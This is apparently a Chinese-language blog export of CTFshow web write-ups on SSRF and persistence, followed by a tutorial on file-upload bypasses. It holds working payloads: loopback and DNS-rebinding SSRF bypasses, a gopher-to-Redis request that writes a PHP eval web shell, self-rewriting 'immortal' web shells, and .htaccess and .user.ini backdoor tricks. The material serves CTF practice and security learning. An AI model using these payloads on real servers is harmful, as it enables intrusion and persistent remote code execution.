<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>
<pre><code class="highlight plaintext">parse_url这个是用来处理URL的，把它解析成各个部分后存储到数组里面
并且要求头为http/https
问题来了它这个正则写的一拓实，没waf一样</code></pre>
<p><code>flag.php</code>一如既往的非本地无法访问,直接加个头就行</p>
<pre><code class="highlight plaintext">http://127.0.0.1/flag.php</code></pre>
<h3 id="web353"><a class="markdownIt-Anchor" href="#web353"></a> web353</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>
<p>对味</p>
<p>那我要用邪门一点的方式来绕过了</p>
<pre><code class="highlight plaintext">http://127.1/flag.php</code></pre>
<p>对于形式这样的ip<code>x.0.0.1</code>可以直接缩写为<code>x.1</code></p>
<p>同时也可以进制替换</p>
<pre><code class="highlight plaintext">127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
也就是说http://127.1.1.1/flag.php其实也可以的</code></pre>
<h3 id="web354"><a class="markdownIt-Anchor" href="#web354"></a> web354</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>这里主要的数字都waf了</p>
<p>那么可以有下面几种想法:</p>
<pre><code class="highlight plaintext">域名指向127
302跳转
DNS-Rebinding</code></pre>
<ul>
<li>
<ol>
<li>在自己的域名里添加一条A记录指向<code>127.0.0.1</code></li>
</ol>
</li>
<li>
<ol start="2">
<li>在自己的网站页面添加</li>
</ol>
</li>
<li>
<ol start="3">
<li>自己去ceye.io注册绑定<code>127.0.0.1</code>然后记得前面加r</li>
</ol>
</li>
</ul>
<pre><code class="highlight plaintext">url=http://r.xxxzc8.ceye.io/flag.php</code></pre>
<h3 id="web355"><a class="markdownIt-Anchor" href="#web355"></a> web355</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>将主机名限制到5位以内，那用缩写格式就行</p>
<p><code>127.1或者0(其实就是0.0.0.0)</code></p>
<h3 id="web356"><a class="markdownIt-Anchor" href="#web356"></a> web356</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>限制到3位以内，127用不了了0可以</p>
<h3 id="web357"><a class="markdownIt-Anchor" href="#web357"></a> web357</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);
<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;
<span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;
    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);
&#125;


<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>不是很懂。。</p>
<pre><code class="highlight plaintext">gethostbyname:成功时返回 IPv4 地址，失败时返回主机名。
filter_var() 函数通过指定的过滤器过滤一个变量。
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。
FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</code></pre>
<p>也就是说这里会验证URL的IP地址不在RFC指定的<code>私有IP</code>范围内（比如 192.168.0.1），且要求值不在<code>保留的IP</code>范围内。</p>
<p>使用DNS重绑定或者用自己的服务器打302</p>
<p>这里可以用第一个，因为有个快捷的网站</p>
<pre><code class="highlight plaintext">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code></pre>
<p>可以直接重绑定，你输一个不会触发内网ip验证的就可以，发包三次就可以拿到flag</p>
<pre><code class="highlight plaintext">分别是:127.0.0.1 ip!
1.1.1.1（我重绑定的ip
1.1.1.1 flag</code></pre>
<p>为什么是三次?我也不知道，调试一下看看好了</p>
<p>但是怪就怪在我自己调是只有爆ip的，出不来。。</p>
<h3 id="web358"><a class="markdownIt-Anchor" href="#web358"></a> web358</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;
    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
&#125;</code></pre>
<p>要用<code>http://ctf</code>开头<code>show</code>结尾</p>
<p>这里利用@</p>
<pre><code class="highlight plaintext">在URL中，@符号通常用于在基本认证（Basic Authentication）中，将用户名和密码包含在URL中。这种用法的格式是：
http://username:password@hostname/path
在这个格式中，username:password 是登录所需的凭据，@ 符号用来分隔凭据和主机名。然而，这种做法在现代网络应用中不推荐使用，因为它容易导致安全问题，比如泄露用户凭据。</code></pre>
<pre><code class="highlight plaintext">POC:
url=http://ctf.com@127.0.0.1/flag.php#show
url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>
<h3 id="web359"><a class="markdownIt-Anchor" href="#web359"></a> web359</h3>
<pre><code class="highlight plaintext">打无密码的mysql</code></pre>
<p>随便输一下转到<code>check.php</code></p>
<p>看到<code>POST:returl=https://404.chall.ctf.show/&amp;u=admin</code></p>
<p>那看来这边可以写马发gopher包了</p>
<p>这里介绍一个工具<code>gopherus</code><a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250710143949440.png" alt="image-20250710143949440"></p>
<p><code>_</code>后面的部分记得二次URL编码(因为发送过去时会被编码一次)</p>
<p>写入成功直接连即可</p>
<h3 id="web360"><a class="markdownIt-Anchor" href="#web360"></a> web360</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>
<p>看似平平无奇，实则暗藏杀机。。</p>
<p><code>file://</code>协议读不出东西</p>
<p>尝试用<code>dict://</code>探测一下端口</p>
<p>最后发现redis的端口是开放的</p>
<pre><code class="highlight plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
<p>记得把<code>_</code>后边编码</p>
<p>接着POST一下，这里不知道为什么POST会卡住然后报错504</p>
<p>但是shell.php是存在的，不知道为什么啊。。希望有大佬可以解答一下</p>
<p>最后直接命令执行即可，喜欢蚁剑也可以</p>
<h2 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h2>
<h3 id="web670"><a class="markdownIt-Anchor" href="#web670"></a> web670</h3>
<pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
var_dump(getcwd()); =&gt;/var/www/html</code></pre>
<p>之后发现无法连上</p>
<p><code>cmd=system(&quot;tac shell.php&quot;);</code>一看没有内容啊。。</p>
<p>看了下其他师傅的博客感觉我思路错了，这里是用<code>file_put_contents</code>来执行</p>
<pre><code class="highlight plaintext">cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);
在源码里可以看到成功写入</code></pre>
<p>但是连不上啊。。后来找了原因发现要在蚁剑里设置忽略https证书</p>
<p>然后check发现把目录清光了。。</p>
<p>草拟吗不死马，来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);
    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);
    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);
    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;
    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;
    <span class="keyword">while</span> (<span class="number">1</span>) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);
        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);
    &#125;
<span class="meta">?&gt;</span></code></pre>
<pre><code class="highlight php"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;17.php&#x27;</span>, <span class="string">&#x27;&lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&#x27;shell.php\&#x27;;$code = \&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;;while (1) &#123;file_put_contents($file, $code);usleep(5000);&#125;?&gt;&#x27;</span>);</code></pre>
<p>解析一下</p>
<pre><code class="highlight plaintext">set_time_limit()函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）
ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True或者1，则忽略与用户的断开）
unlink(FILE)函数：删除文件（防止文件落地被检测工具查杀）
file_put_contents函数：将一个字符串写入该文件中
usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>
]]></content>
      <tags>
        <tag>-Web -CTF -WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a class="markdownIt-Anchor" href="#文件上传漏洞"></a> 文件上传漏洞</h1>
<p>大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾)</p>
<h2 id="前端检测"><a class="markdownIt-Anchor" href="#前端检测"></a> 前端检测</h2>
<p>前端检测上传文件的后缀，js检测直接禁用js</p>
<h2 id="后端检测"><a class="markdownIt-Anchor" href="#后端检测"></a> 后端检测</h2>
<h3 id="检测content-type"><a class="markdownIt-Anchor" href="#检测content-type"></a> 检测content-type</h3>
<p>检测你发包的Content-Type参数来判断文件上传类型</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p>
<p>一般你改一下content-type就可以绕过了</p>
<h3 id="检测文件头判断文件类型"><a class="markdownIt-Anchor" href="#检测文件头判断文件类型"></a> 检测文件头判断文件类型</h3>
<p>字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头</p>
<p>这种时候伪造一下就可以</p>
<pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> 
jpg、jpeg : FF D8 FF 
png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre>
<p>用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测，或者你直接在包的头写个GIF89a也是可以过的</p>
<h3 id="后端检测文件拓展名"><a class="markdownIt-Anchor" href="#后端检测文件拓展名"></a> 后端检测文件拓展名</h3>
<p>用拓展名的黑名单来检测文件拓展名从而防止危险文件的上传</p>
<p>绕过:</p>
<p>1)使用一些特殊扩展名来绕过,<code>php</code>可以用php3、php4、php5代替</p>
<p>2)大小写混淆绕过</p>
<p>3)在文件名后加<code>.</code>(空格，点，空格)，利用windows特性绕过</p>
<p>4)在文件名后加<code>::$data</code>绕过(<strong>NTFS流</strong>读入)</p>
<p>5)有替换的话可以双写绕过</p>
<hr>
<p>当然也可以是白名单只让特定的文件上传</p>
<p>绕过:</p>
<p>存储路径可以使用%00在最后进行截断，（注意：GET型可以对%00自动解码，但POST型不能，需要在二进制中修改//打开你的010喵，用空格占个位来输00）</p>
<h3 id="后端检测文件内容"><a class="markdownIt-Anchor" href="#后端检测文件内容"></a> 后端检测文件内容</h3>
<h4 id="文件内容替换"><a class="markdownIt-Anchor" href="#文件内容替换"></a> 文件内容替换</h4>
<p>检测原理：</p>
<p>在后端处理上传的文件时，会将将文件中的敏感字符替换掉。<br>
参考代码</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;
<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);
<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);
<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];

<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;
&#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>绕过方法：<br>
根据实际过滤的字符来判断，（一般不会限制所有敏感字符，因为还要兼顾图片上传）</p>
<h4 id="图片二次渲染"><a class="markdownIt-Anchor" href="#图片二次渲染"></a> 图片二次渲染</h4>
<p>检测原理：<br>
后端调用了<code>php</code>的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
<p>绕过方法：<br>
比较过滤前后文件内容，一般不会全部过滤。<br>
比较使用<code>php-gd</code>转换之前和之后的gif图像，并搜索它们之间的任何相似性，因此，如果我在原始文件中找到相似的部分，则在使用<code>php-gd</code>转换后也保留了该部分然后我可以在那部分注入我的PHP代码并获得RCE</p>
<h3 id="条件竞争"><a class="markdownIt-Anchor" href="#条件竞争"></a> 条件竞争</h3>
<p>该漏洞形成逻辑：<br>
网站允许上传文件，然后检查上传文件是否包含<code>webshell</code>、是否是指定的文件类型。如果不是，那么删除该文件。在删除之前访问上传的<code>php</code>文件，从而执行上传文件中的<code>php</code>代码。</p>
<p>绕过方法：<br>
先进行文件上传，后进行判断与删除。利用时间差进行<code>webshell</code>上传。<br>
竞争条件代码举例：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);
<span class="meta">?&gt;</span></code></pre>
<p>判断是否删除</p>
<pre><code class="highlight python"><span class="keyword">import</span> requests  
<span class="keyword">while</span> true:  
	requests.get(”路径“)</code></pre>
<h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h2>
<p>当文件完全被ban，只用以图片类型上传的时候，我们该怎么办呢</p>
<h3 id="上传htaccess文件绕过"><a class="markdownIt-Anchor" href="#上传htaccess文件绕过"></a> 上传.htaccess文件绕过</h3>
<p><code>.htaccess</code>文件是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
<p><code>.htaccess</code>主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p><code>.htaccess</code>的用途范围主要针对当前目录</p>
<p>类似内容</p>
<pre><code class="highlight plaintext">ForceType application/x-httpd-php
SetHandler application/x-httpd-php
这些都会把上传的文件强制解析为php</code></pre>
<h3 id="上传userini文件绕过"><a class="markdownIt-Anchor" href="#上传userini文件绕过"></a> 上传.user.ini文件绕过</h3>
<p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<strong>fastcgi</strong>运行的<code>php</code>都可以用这个方法。</p>
<p>那么什么是<code>.user.ini</code>？这得从<code>php.ini</code>说起了。<code>php.ini</code>是<code>php</code>默认的配置文件，其中包括了很多<code>php</code>的配置，这些配置中，又分为几种：<em>PHP_INI_SYSTEM</em>、<em>PHP_INI_PERDIR</em>、<em>PHP_INI_ALL</em>、<em>PHP_INI_USER</em>。在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
<p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p>
<p>除了主 <code>php.ini </code>之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
<p>所以除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。我们可以很容易地借助<code>.user.ini</code>文件，更改<code>auto_prepend_file</code>配置项，来构造一个“后门”。</p>
<p>比如，某网站限制不允许上传<code>.php</code>文件，你便可以上传一个<code>.user.ini</code>，再上传一个图片马，包含起来进行<code>getshell</code>。不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
<p>实例([SUCTF 2019]CheckIn1):</p>
<pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);
<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;
    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);
&#125;
<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);
<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;
